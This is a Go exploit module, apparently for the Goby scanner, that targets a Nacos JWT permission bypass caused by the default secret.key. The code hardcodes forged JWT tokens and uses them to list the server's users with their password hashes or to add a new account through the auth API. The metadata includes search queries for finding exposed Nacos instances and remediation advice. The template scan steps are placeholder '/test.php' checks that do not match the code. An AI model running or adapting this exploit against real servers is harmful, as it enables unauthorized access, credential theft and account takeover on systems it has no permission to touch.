package exploits

import (
	"encoding/json"
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Nacos jwt permission bypass vulnerability",
    "Description": "<p>Nacos provides a simple and easy-to-use feature set to help you quickly implement dynamic service discovery, service configuration, service metadata and traffic management.</p><p>Nacos uses the default secret.key, and an attacker can use the default secret.key to generate a JWT Token, thereby bypassing permissions and accessing the relevant API interface.</p>",
    "Product": "NACOS",
    "Homepage": "https://nacos.io/zh-cn/index.html",
    "DisclosureDate": "2023-03-04",
    "PostTime": "2023-10-17",
    "Author": "woo0nise@gmail.com",
    "FofaQuery": " title=\"Nacos\" || (body=\"Alibaba Group Holding Ltd.\" && body=\"src=\\\"js/main.js\" && body=\"console-fe\") || (banner=\"/nacos/\" && (banner=\"HTTP/1.1 302\" || banner=\"HTTP/1.1 301 Moved Permanently\")) || banner=\"realm=\\\"nacos\"",
    "GobyQuery": " title=\"Nacos\" || (body=\"Alibaba Group Holding Ltd.\" && body=\"src=\\\"js/main.js\" && body=\"console-fe\") || (banner=\"/nacos/\" && (banner=\"HTTP/1.1 302\" || banner=\"HTTP/1.1 301 Moved Permanently\")) || banner=\"realm=\\\"nacos\"",
    "Level": "2",
    "Impact": "<p>Nacos uses the default secret.key, and an attacker can use the default secret.key to generate a JWT Token, thereby bypassing permissions and accessing the relevant API interface.</p>",
    "Recommendation": "<p>1. Modify secret.key to a random value according to the official document <a href=\"https://nacos.io/zh-cn/docs/auth.html\">https://nacos.io/zh-cn/docs/auth.html</a>.</p><p>2. Upgrade to the latest version.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "listUser,addUser",
            "show": ""
        },
        {
            "name": "addUser",
            "type": "select",
            "value": "auto,custom",
            "show": "attackType=addUser"
        },
        {
            "name": "username",
            "type": "input",
            "value": "1552eedfe1caab87",
            "show": "addUser=custom"
        },
        {
            "name": "password",
            "type": "input",
            "value": "1552eedfe1caab87",
            "show": "addUser=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        "CNVD-2023-17316"
    ],
    "CVSSScore": "7.7",
    "Translation": {
        "CN": {
            "Name": "Nacos jwt 权限绕过漏洞",
            "Product": "NACOS",
            "Description": "<p>Nacos 提供了一组简单易用的特性集，帮助您快速实现动态服务发现、服务配置、服务元数据及流量管理。</p><p>Nacos 使用了默认的 secret.key，则攻击者可利用默认 secret.key 生成 JWT Token，从而造成权限绕过访问到相关 API 接口。</p>",
            "Recommendation": "<p>1、根据官方文档 <a href=\"https://nacos.io/zh-cn/docs/auth.html\" target=\"_blank\">https://nacos.io/zh-cn/docs/auth.html</a> 修改secret.key 为随机值。</p><p>2、升级至最新版本。</p>",
            "Impact": "<p>Nacos 使用了默认的 secret.key，则攻击者可利用默认 secret.key 生成 JWT Token，从而造成权限绕过访问到相关 API 接口。<br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "Nacos jwt permission bypass vulnerability",
            "Product": "NACOS",
            "Description": "<p>Nacos provides a simple and easy-to-use feature set to help you quickly implement dynamic service discovery, service configuration, service metadata and traffic management.</p><p>Nacos uses the default secret.key, and an attacker can use the default secret.key to generate a JWT Token, thereby bypassing permissions and accessing the relevant API interface.</p>",
            "Recommendation": "<p>1. Modify secret.key to a random value according to the official document <a href=\"https://nacos.io/zh-cn/docs/auth.html\" target=\"_blank\">https://nacos.io/zh-cn/docs/auth.html</a>.</p><p>2. Upgrade to the latest version.</p>",
            "Impact": "<p>Nacos uses the default secret.key, and an attacker can use the default secret.key to generate a JWT Token, thereby bypassing permissions and accessing the relevant API interface.<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10854"
}`
	accessTokensFlagqwJlkE := []string{"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g",
		"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTcxMDUwNDAxOX0.vW8mpBNoJ7hVKPNhEtQl4Z5b00G4P9Ktrn_7c58crOk",
		"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY5ODg5NDcyN30.feetKmWoPnMkAebjkNnyuKo6c21_hzTgu0dfNqbdpZQ"}

	addUserFlagqwJlkE := func(hostInfo *httpclient.FixUrl, accessToken, username, password string) (*httpclient.HttpResponse, error) {
		uris := []string{`/nacos/v1/auth/users?username={{username}}&password={{password}}`, `/v1/auth/users?username={{username}}&password={{password}}`}
		for _, uri := range uris {
			uri = strings.ReplaceAll(uri, `{{username}}`, username)
			uri = strings.ReplaceAll(uri, `{{password}}`, password)
			addUserRequest := httpclient.NewPostRequestConfig(uri)
			addUserRequest.VerifyTls = false
			addUserRequest.FollowRedirect = false
			addUserRequest.Header.Store("Accesstoken", accessToken)
			addUserRequest.Header.Store(`Authorization`, `Bearer `+accessToken)
			rsp, err := httpclient.DoHttpRequest(hostInfo, addUserRequest)
			if err != nil {
				return nil, err
			}
			if rsp.StatusCode == 404 {
				continue
			}
			return rsp, err
		}
		return nil, errors.New("漏洞利用失败")
	}

	listUserFlagqwJlkE := func(hostInfo *httpclient.FixUrl, accessToken string) ([]string, error) {
		uris := []string{`/nacos/v1/auth/users?pageNo=1&pageSize=9`, `/v1/auth/users?pageNo=1&pageSize=9`}
		for _, uri := range uris {
			getRequestConfig := httpclient.NewGetRequestConfig(uri)
			getRequestConfig.VerifyTls = false
			getRequestConfig.FollowRedirect = false
			getRequestConfig.Header.Store("Accesstoken", accessToken)
			getRequestConfig.Header.Store(`Authorization`, `Bearer `+accessToken)
			rsp, err := httpclient.DoHttpRequest(hostInfo, getRequestConfig)
			if err != nil {
				return nil, err
			}
			if rsp.StatusCode == 404 {
				continue
			}
			// json 反序列化
			var data map[string]interface{}
			err = json.Unmarshal([]byte(rsp.Utf8Html), &data)
			var userList []string
			if err != nil {
				continue
			}
			pageItems, ok := data["pageItems"].([]interface{})
			if !ok {
				continue
			}
			for _, item := range pageItems {
				itemData, ok := item.(map[string]interface{})
				if !ok {
					continue
				}
				username, ok := itemData["username"].(string)
				if !ok {
					continue
				}
				password, ok := itemData["password"].(string)
				if !ok {
					continue
				}
				userList = append(userList, username+"\t"+password)
			}
			return userList, nil
		}
		return nil, errors.New("漏洞利用失败")
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			for _, accessToken := range accessTokensFlagqwJlkE {
				userList, err := listUserFlagqwJlkE(hostInfo, accessToken)
				if err != nil {
					return false
				} else if userList != nil {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			username := goutils.B2S(ss.Params["username"])
			password := goutils.B2S(ss.Params["password"])
			adduser := goutils.B2S(ss.Params["addUser"])
			if attackType == "listUser" {
				for _, accessToken := range accessTokensFlagqwJlkE {
					userList, err := listUserFlagqwJlkE(expResult.HostInfo, accessToken)
					if err != nil {
						expResult.Success = false
						expResult.Output = err.Error()
						break
					} else if userList != nil {
						expResult.Output = strings.Join(userList, "\n")
						expResult.Success = true
						break
					}
				}
			} else if attackType == "addUser" {
				if adduser == "auto" {
					username = goutils.RandomHexString(16)
					password = goutils.RandomHexString(16)
				}
				for _, accessToken := range accessTokensFlagqwJlkE {
					rsp, err := addUserFlagqwJlkE(expResult.HostInfo, accessToken, username, password)
					if err != nil {
						expResult.Success = false
						expResult.Output = err.Error()
						break
					} else if strings.Contains(rsp.Utf8Html, `create user ok!`) {
						expResult.Success = true
						expResult.Output = `username: ` + username + "\npassword: " + password
						break
					}
				}
			}
			return expResult
		},
	))
}
